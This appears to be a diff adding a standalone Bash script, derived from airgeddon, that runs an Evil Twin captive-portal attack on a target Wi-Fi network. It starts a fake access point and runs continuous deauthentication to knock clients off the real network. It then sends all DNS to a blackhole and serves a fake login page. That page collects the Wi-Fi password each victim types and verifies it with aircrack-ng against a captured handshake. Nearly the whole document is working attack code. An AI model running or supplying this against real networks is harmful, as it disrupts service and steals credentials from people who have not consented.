+		"${iptables_cmd}" -t nat -F 2> /dev/null
+		"${iptables_cmd}" -t mangle -F 2> /dev/null
+		"${iptables_cmd}" -t raw -F 2> /dev/null
+		"${iptables_cmd}" -t security -F 2> /dev/null
+		"${iptables_cmd}" -t mangle -X 2> /dev/null
+		"${iptables_cmd}" -t raw -X 2> /dev/null
+		"${iptables_cmd}" -t security -X 2> /dev/null
+		"${iptables_cmd}" -D INPUT -j input_"${airgeddon_instance_name}" 2> /dev/null
+		"${iptables_cmd}" -D FORWARD -j forward_"${airgeddon_instance_name}" 2> /dev/null
+		"${iptables_cmd}" -F input_"${airgeddon_instance_name}" 2> /dev/null
+		"${iptables_cmd}" -F forward_"${airgeddon_instance_name}" 2> /dev/null
+		"${iptables_cmd}" -X input_"${airgeddon_instance_name}" 2> /dev/null
+		"${iptables_cmd}" -X forward_"${airgeddon_instance_name}" 2> /dev/null
+		"${iptables_cmd}" -X 2> /dev/null
+		"${iptables_cmd}" -t nat -X 2> /dev/null
+	fi
+}
+
+function clean_this_instance_iptables_nftables() {
+	debug_print
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		"${iptables_cmd}" delete table filter_"${airgeddon_instance_name}" 2> /dev/null
+		"${iptables_cmd}" delete table nat_"${airgeddon_instance_name}" 2> /dev/null
+	else
+		"${iptables_cmd}" -D INPUT -j input_"${airgeddon_instance_name}" 2> /dev/null
+		"${iptables_cmd}" -D FORWARD -j forward_"${airgeddon_instance_name}" 2> /dev/null
+		"${iptables_cmd}" -F input_"${airgeddon_instance_name}" 2> /dev/null
+		"${iptables_cmd}" -F forward_"${airgeddon_instance_name}" 2> /dev/null
+		"${iptables_cmd}" -X input_"${airgeddon_instance_name}" 2> /dev/null
+		"${iptables_cmd}" -X forward_"${airgeddon_instance_name}" 2> /dev/null
+	fi
+}
+
+function prepare_iptables_nftables() {
+	debug_print
+	clean_this_instance_iptables_nftables
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		"${iptables_cmd}" add table ip filter_"${airgeddon_instance_name}"
+		"${iptables_cmd}" add chain ip filter_"${airgeddon_instance_name}" forward_"${airgeddon_instance_name}" '{type filter hook forward priority 0; policy accept;}'
+		"${iptables_cmd}" add chain ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" '{type filter hook input priority 0;}'
+		"${iptables_cmd}" add table ip nat_"${airgeddon_instance_name}"
+		"${iptables_cmd}" add chain ip nat_"${airgeddon_instance_name}" prerouting_"${airgeddon_instance_name}" '{type nat hook prerouting priority -100;}'
+		"${iptables_cmd}" add chain ip nat_"${airgeddon_instance_name}" postrouting_"${airgeddon_instance_name}" '{type nat hook postrouting priority 100;}'
+	else
+		"${iptables_cmd}" -P FORWARD ACCEPT
+		"${iptables_cmd}" -t filter -N input_"${airgeddon_instance_name}"
+		"${iptables_cmd}" -A INPUT -j input_"${airgeddon_instance_name}"
+		"${iptables_cmd}" -t filter -N forward_"${airgeddon_instance_name}"
+		"${iptables_cmd}" -A FORWARD -j forward_"${airgeddon_instance_name}"
+	fi
+}
+
+function clean_initialize_iptables_nftables() {
+	debug_print
+	if [ "${1}" = "start" ]; then
+		if [[ "${clean_all_iptables_nftables}" -eq 1 ]] && is_first_routing_modifier_airgeddon_instance; then
+			clean_all_iptables_nftables
+		fi
+		prepare_iptables_nftables
+	else
+		if is_last_airgeddon_instance; then
+			clean_all_iptables_nftables
+		else
+			clean_this_instance_iptables_nftables
+		fi
+	fi
+}
+
+function set_std_internet_routing_rules() {
+	debug_print
+	control_routing_status "start"
+	if [ ! -f "${system_tmpdir}${routing_tmp_file}" ]; then
+		save_iptables_nftables
+	fi
+	ip addr add "${et_ip_router}/${std_c_mask}" dev "${interface}" > /dev/null 2>&1
+	ip route add "${et_ip_range}/${std_c_mask_cidr}" dev "${interface}" table local proto static scope link > /dev/null 2>&1
+	routing_modified=1
+	clean_initialize_iptables_nftables "start"
+	echo "1" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
+	if [ "${et_mode}" = "et_captive_portal" ]; then
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip nat_"${airgeddon_instance_name}" prerouting_"${airgeddon_instance_name}" iifname "${interface}" tcp dport "${www_port}" counter dnat to "${et_ip_router}:${www_port}"
+			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" tcp dport "${www_port}" counter accept
+			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" tcp dport "${https_port}" counter accept
+			"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" udp dport "${dns_port}" counter accept
+		else
+			"${iptables_cmd}" -t nat -A PREROUTING -p tcp -i "${interface}" --dport "${www_port}" -j DNAT --to-destination "${et_ip_router}:${www_port}"
+			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -p tcp -i "${interface}" --destination-port "${www_port}" -j ACCEPT
+			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -p tcp -i "${interface}" --destination-port "${https_port}" -j ACCEPT
+			"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -p udp -i "${interface}" --destination-port "${dns_port}" -j ACCEPT
+		fi
+	fi
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" ip daddr "${et_ip_router}/${ip_mask_cidr}" icmp type echo-request ct state new,related,established counter accept
+		"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" ip daddr "${et_ip_router}/${ip_mask_cidr}" counter drop
+	else
+		"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -i "${interface}" -p icmp --icmp-type 8 -d "${et_ip_router}/${ip_mask}" -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
+		"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -d "${et_ip_router}/${ip_mask}" -j DROP
+	fi
+	sleep 2
+}
+
+function launch_dhcp_server() {
+	debug_print
+	recalculate_windows_sizes
+	dchcpd_scr_window_position=${g3_middleleft_window}
+	rm -rf "/var/run/${dhcpd_pid_file}" 2> /dev/null
+	manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${dchcpd_scr_window_position} -T \"DHCP\"" "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}clts.txt 2>&1" "DHCP"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "dhcpd -d -cf \"${dhcp_path}\" ${interface}"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
+	sleep 2
+}
+
+function set_et_control_script() {
+	debug_print
+	rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1
+	exec 7>"${tmpdir}${control_et_file}"
+	cat >&7 <<-EOF
+		#!/usr/bin/env bash
+		path_to_processes="${tmpdir}${et_processesfile}"
+		path_to_channelfile="${tmpdir}${channelfile}"
+		attempts_path="${tmpdir}${webdir}${attemptsfile}"
+
+		function kill_pid_and_children_recursive() {
+			local parent_pid="" child_pids=""
+			parent_pid="\${1}"
+			child_pids=\$(pgrep -P "\${parent_pid}" 2> /dev/null)
+			for child_pid in \${child_pids}; do kill_pid_and_children_recursive "\${child_pid}"; done
+			if [ -n "\${child_pids}" ]; then pkill -P "\${parent_pid}" &> /dev/null; fi
+			kill "\${parent_pid}" &> /dev/null
+			wait "\${parent_pid}" 2> /dev/null
+		}
+
+		function kill_et_processes_control_script() {
+			readarray -t ET_PROCESSES_TO_KILL < <(cat < "\${path_to_processes}" 2> /dev/null)
+			for item in "\${ET_PROCESSES_TO_KILL[@]}"; do kill_pid_and_children_recursive "\${item}"; done
+		}
+
+		date_counter=\$(date +%s)
+		while true; do
+			et_control_window_channel=\$(cat "\${path_to_channelfile}" 2> /dev/null)
+			clear
+			echo -e "\tBSSID: ${bssid}  CH: \${et_control_window_channel}  ESSID: ${essid}"
+			echo
+			echo -e "\t[Captive Portal Attack Running]"
+			hours=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%H)
+			mins=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%M)
+			secs=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%S)
+			echo -e "\t\${hours}:\${mins}:\${secs}"
+			echo
+			if [ -f "${tmpdir}${webdir}${et_successfile}" ]; then
+				echo -e "\t[+] Password captured!"
+				cat "${tmpdir}${webdir}${currentpassfile}" 2>/dev/null
+				kill_et_processes_control_script
+				exit 0
+			fi
+			attempts_number=\$((cat < "\${attempts_path}" | wc -l) 2> /dev/null)
+			echo -e "\tAttempts: \${attempts_number}"
+			echo
+			echo -e "\tConnected clients (DHCP):"
+			readarray -t DHCPCLIENTS < <(grep DHCPACK < "${tmpdir}clts.txt")
+			client_ips=()
+			if [[ -z "\${DHCPCLIENTS[@]}" ]]; then
+				echo -e "\t(none)"
+			else
+				for client in "\${DHCPCLIENTS[@]}"; do
+					[[ \${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="\${BASH_REMATCH[1]}" && client_mac="\${BASH_REMATCH[2]}"
+					if [[ " \${client_ips[*]} " != *" \${client_ip} "* ]]; then
+						echo -e "\t\${client_ip} \${client_mac}"
+						client_ips+=("\${client_ip}")
+					fi
+				done
+			fi
+			sleep 1
+		done
+	EOF
+	exec 7>&-
+	sleep 1
+}
+
+function launch_et_control_window() {
+	debug_print
+	recalculate_windows_sizes
+	control_scr_window_position=${g4_topright_window}
+	manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${control_scr_window_position} -T \"Control\"" "bash \"${tmpdir}${control_et_file}\"" "Control" "active"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_process_control_window=$!
+	else
+		get_tmux_process_id "bash \"${tmpdir}${control_et_file}\""
+		et_process_control_window="${global_process_pid}"
+		global_process_pid=""
+	fi
+}
+
+function launch_dns_blackhole() {
+	debug_print
+	recalculate_windows_sizes
+	rm -rf "${tmpdir}${dnsmasq_file}" > /dev/null 2>&1
+	{
+	echo -e "interface=${interface}"
+	echo -e "address=/#/${et_ip_router}"
+	echo -e "port=${dns_port}"
+	echo -e "bind-dynamic"
+	echo -e "except-interface=${loopback_interface}"
+	echo -e "address=/google.com/172.217.5.238"
+	echo -e "address=/gstatic.com/172.217.5.238"
+	echo -e "no-dhcp-interface=${interface}"
+	echo -e "log-queries"
+	echo -e "no-daemon"
+	echo -e "no-resolv"
+	echo -e "no-hosts"
+	} >> "${tmpdir}${dnsmasq_file}"
+	manage_output "+j -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"DNS\"" "dnsmasq -C \"${tmpdir}${dnsmasq_file}\"" "DNS"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "dnsmasq -C \"${tmpdir}${dnsmasq_file}\""
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
+}
+
+function set_webserver_config() {
+	debug_print
+	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${webserver_log}" > /dev/null 2>&1
+	{
+	echo -e "server.document-root = \"${tmpdir}${webdir}\"\n"
+	echo -e "server.modules = ("
+	echo -e "\"mod_auth\","
+	echo -e "\"mod_cgi\","
+	echo -e "\"mod_redirect\","
+	echo -e "\"mod_accesslog\""
+	echo -e ")\n"
+	echo -e "\$HTTP[\"host\"] =~ \"(.*)\" {"
+	echo -e "url.redirect = ( \"^/index.htm$\" => \"/\")"
+	echo -e "url.redirect-code = 302"
+	echo -e "}"
+	echo -e "server.bind = \"${et_ip_router}\""
+	echo -e "server.port = ${www_port}\n"
+	echo -e "index-file.names = (\"${indexfile}\")"
+	echo -e "server.error-handler-404 = \"/\"\n"
+	echo -e "mimetype.assign = ("
+	echo -e "\".css\" => \"text/css\","
+	echo -e "\".htm\" => \"text/html\","
+	echo -e "\".html\" => \"text/html\","
+	echo -e "\".js\" => \"text/javascript\""
+	echo -e ")\n"
+	echo -e "cgi.assign = ("
+	echo -e "\".htm\" => \"/bin/bash\""
+	echo -e ")\n"
+	echo -e "accesslog.filename = \"${tmpdir}${webserver_log}\""
+	echo -e "accesslog.escaping = \"default\""
+	echo -e "accesslog.format = \"%h %s %r %v%U %t '%{User-Agent}i'\""
+	echo -e "\$HTTP[\"remote-ip\"] == \"${loopback_ip}\" { accesslog.filename = \"\" }"
+	} >> "${tmpdir}${webserver_file}"
+	sleep 2
+}
+
+function set_captive_portal_page() {
+	debug_print
+	{
+	echo -e "body * { box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }"
+	echo -e ".button { color: #ffffff; background-color: ${captive_portal_button_color}; border-radius: 5px; cursor: pointer; height: 30px; }"
+	echo -e ".content { width: 100%; background-color: ${captive_portal_bg_color}; padding: 20px; margin: 15px auto 0; border-radius: 15px; color: #ffffff; }"
+	echo -e ".title { text-align: center; margin-bottom: 15px; }"
+	echo -e "#password { width: 100%; margin-bottom: 5px; border-radius: 5px; height: 30px; }"
+	} >> "${tmpdir}${webdir}${cssfile}"
+
+	{
+	echo -e "#!/usr/bin/env bash"
+	echo -e "echo '<!DOCTYPE html>'"
+	echo -e "echo '<html><head>'"
+	echo -e "echo '<meta name=\"viewport\" content=\"width=device-width\"/>'"
+	echo -e "echo '<title>WiFi Login</title>'"
+	echo -e "echo '<link rel=\"stylesheet\" type=\"text/css\" href=\"${cssfile}\"/>'"
+	echo -e "echo '</head><body>'"
+	echo -e "echo '<div class=\"content\">'"
+	echo -e "echo '<form method=\"post\" action=\"check.htm\">'"
+	echo -e "echo '<div class=\"title\"><p>WiFi Authentication Required</p>'"
+	echo -e "echo '<span class=\"bold\">${essid//[\`\']/}</span></div>'"
+	echo -e "echo '<p>Enter your WiFi password to connect to the internet:</p>'"
+	echo -e "echo '<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"Password\" pattern=\".{8,}\" required/><br/>'"
+	echo -e "echo '<button class=\"button\" type=\"submit\">Connect</button>'"
+	echo -e "echo '</form></div></body></html>'"
+	echo -e "exit 0"
+	} >> "${tmpdir}${webdir}${indexfile}"
+
+	base64 -d <<< "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdj+P///38ACfsD/QVDRcoAAAAASUVORK5CYII=" > "${tmpdir}${webdir}${pixelfile}"
+
+	exec 4>"${tmpdir}${webdir}${checkfile}"
+	cat >&4 <<-EOF
+		#!/usr/bin/env bash
+		echo '<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><title>WiFi Login</title></head><body><div>'
+		POST_DATA=\$(cat /dev/stdin)
+		if [[ "\${REQUEST_METHOD}" = "POST" ]] && [[ "\${CONTENT_LENGTH}" -gt 0 ]]; then
+			POST_DATA=\${POST_DATA#*=}
+			password=\${POST_DATA//+/ }
+			password=\$(printf '%b' "\${password//%/\\\x}")
+		fi
+		if [[ "\${#password}" -ge 8 ]] && [[ "\${#password}" -le 63 ]]; then
+			rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
+			echo "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
+			if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
+				touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
+				echo '<p>Password correct! You are now connected.</p>'
+			else
+				echo "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
+				echo '<p>Incorrect password. Please try again.</p>'
+				echo '<script>setTimeout(function(){window.location="/"},3500);</script>'
+			fi
+		else
+			echo '<p>Password must be 8-63 characters.</p>'
+			echo '<script>setTimeout(function(){window.location="/"},3500);</script>'
+		fi
+		echo '</div></body></html>'
+	EOF
+	exec 4>&-
+	sleep 3
+}
+
+function launch_webserver() {
+	debug_print
+	recalculate_windows_sizes
+	lighttpd_window_position=${g4_bottomright_window}
+	manage_output "+j -bg \"#000000\" -fg \"#FFFF00\" -geometry ${lighttpd_window_position} -T \"Webserver\"" "lighttpd -D -f \"${tmpdir}${webserver_file}\"" "Webserver"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "lighttpd -D -f \"${tmpdir}${webserver_file}\""
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
+}
+
+function write_et_processes() {
+	debug_print
+	rm -rf "${tmpdir}${et_processesfile}" > /dev/null 2>&1
+	for item in "${et_processes[@]}"; do
+		echo "${item}" >> "${tmpdir}${et_processesfile}"
+	done
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		for item in "${dos_pursuit_mode_pids[@]}"; do
+			echo "${item}" >> "${tmpdir}${et_processesfile}"
+		done
+	fi
+}
+
+function clean_tmpfiles() {
+	debug_print
+	if [ "${1}" = "exit_script" ]; then
+		rm -rf "${tmpdir}" > /dev/null 2>&1
+		rm -rf "${scriptfolder}${hostapd_wpe_default_log}" > /dev/null 2>&1
+		if [ "${dhcpd_path_changed}" -eq 1 ]; then
+			rm -rf "${dhcp_path}" > /dev/null 2>&1
+		fi
+		if is_last_airgeddon_instance; then
+			delete_instance_orchestrator_file
+		fi
+	else
+		rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
+		rm -rf "${tmpdir}${et_processesfile}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${dnsmasq_file}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${webserver_log}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
+		rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
+		rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
+	fi
+	if [ "${dhcpd_path_changed}" -eq 1 ]; then
+		rm -rf "${dhcp_path}" > /dev/null 2>&1
+	fi
+}
+
+function delete_instance_orchestrator_file() {
+	debug_print
+	if [ -f "${system_tmpdir}${ag_orchestrator_file}" ]; then
+		rm -rf "${system_tmpdir}${ag_orchestrator_file}" > /dev/null 2>&1
+	fi
+}
+
+# ============================================================
+# 메인 공격 함수
+# ============================================================
+
+function exec_et_captive_portal_attack() {
+	debug_print
+	trap '_cp_cleanup' SIGINT SIGTERM
+
+	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
+	mkdir -p "${tmpdir}${webdir}" > /dev/null 2>&1
+
+	echo "[*] Setting ${interface} to managed mode..."
+	ip link set "${interface}" down > /dev/null 2>&1
+	iw "${interface}" set type managed > /dev/null 2>&1
+	ip link set "${interface}" up > /dev/null 2>&1
+
+	echo "${channel}" > "${tmpdir}${channelfile}"
+
+	echo "[*] Generating hostapd config..."
+	set_hostapd_config
+	echo "[*] Launching Fake AP (${essid} on ch${channel})..."
+	launch_fake_ap
+	echo "[+] Fake AP launched."
+
+	echo "[*] Configuring network interface..."
+	set_network_interface_data
+	set_dhcp_config
+	echo "[*] Setting up routing rules..."
+	set_std_internet_routing_rules
+	echo "[+] Routing configured."
+
+	echo "[*] Launching DHCP server..."
+	launch_dhcp_server
+	echo "[+] DHCP server running."
+
+	echo "[*] Starting deauth attack (${et_dos_attack}) on ${bssid}..."
+	# exec_et_deauth는 deauth_standalone.sh에 있으므로 직접 실행
+	prepare_et_monitor
+	case ${et_dos_attack} in
+		"${mdk_command}")
+			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
+			echo "${bssid}" > "${tmpdir}bl.txt"
+			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+		;;
+		"Aireplay")
+			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
+		;;
+		"Auth DoS")
+			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} a -a ${bssid} -m"
+		;;
+	esac
+	recalculate_windows_sizes
+	deauth_scr_window_position=${g4_bottomleft_window}
+	manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth\"" "${deauth_et_cmd}" "Deauth"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "${deauth_et_cmd}"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
+	sleep 1
+	echo "[+] Deauth started."
+
+	echo "[*] Setting up DNS blackhole..."
+	launch_dns_blackhole
+	echo "[*] Configuring webserver..."
+	set_webserver_config
+	echo "[*] Creating captive portal page..."
+	set_captive_portal_page
+	echo "[*] Launching webserver..."
+	launch_webserver
+	echo "[+] Webserver running."
+
+	echo "[*] Setting up control window..."
+	set_et_control_script
+	launch_et_control_window
+	write_et_processes
+
+	echo
+	echo "[+] All components running. Press Ctrl+C to stop."
+	while true; do sleep 1; done
+}
+
+function prepare_et_monitor() {
+	debug_print
+	disable_rfkill
+	iface_phy_number=${phy_interface:3:1}
+	iface_monitor_et_deauth="mon${iface_phy_number}"
+	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
+	iw phy "${phy_interface}" interface add "${iface_monitor_et_deauth}" type monitor 2> /dev/null
+	ip link set "${iface_monitor_et_deauth}" up > /dev/null 2>&1
+	iw dev "${iface_monitor_et_deauth}" set channel "${channel}" > /dev/null 2>&1
+}
+
+function _cp_cleanup() {
+	echo
+	echo "[*] Stopping Captive Portal attack..."
+	kill_et_windows
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		recover_current_channel
+	fi
+	echo "[*] Cleaning up iptables rules..."
+	clean_initialize_iptables_nftables "end"
+	echo "[*] Restoring interface..."
+	restore_et_interface
+	echo "[*] Cleaning up temp files..."
+	clean_tmpfiles "exit_script"
+	echo "[+] Cleanup complete."
+	exit 0
+}
+
+echo "[*] Starting Evil Twin Captive Portal Attack..."
+echo "    Target BSSID    : ${bssid}"
+echo "    Target ESSID    : ${essid}"
+echo "    Channel         : ${channel}"
+echo "    Interface       : ${interface}"
+echo "    DoS method      : ${et_dos_attack}"
+echo "    Handshake file  : ${et_handshake}"
+echo
+
+if [ "$(id -u)" -ne 0 ]; then
+	echo "[!] Root privileges required. Run with sudo." >&2
+	exit 1
+fi
+
+if [ -z "${interface}" ] || [ -z "${bssid}" ] || [ -z "${essid}" ] || [ -z "${channel}" ]; then
+	echo "[!] Required config values are missing in: ${_config_file}" >&2
+	echo "    Required: interface, bssid, essid, channel" >&2
+	exit 1
+fi
+
+if [ -z "${et_handshake}" ] || [ ! -f "${et_handshake}" ]; then
+	echo "[!] Handshake file not found: ${et_handshake}" >&2
+	echo "    Set et_handshake= in ${_config_file}" >&2
+	exit 1
+fi
+
+echo "[*] Checking configuration... OK"
+
+if [ -z "${phy_interface}" ]; then
+	phy_interface=$(physical_interface_finder "${interface}")
+	echo "[*] Physical interface detected: ${phy_interface}"
+fi
+
+echo "[*] Checking interface band support..."
+check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
+echo "[*] Interface band: ${interfaces_band_info[main_wifi_interface,text]}"
+
+mkdir -p "${tmpdir}"
+echo "${agpid_to_use}" > "${system_tmpdir}${ag_orchestrator_file}"
+echo
+
+exec_et_captive_portal_attack
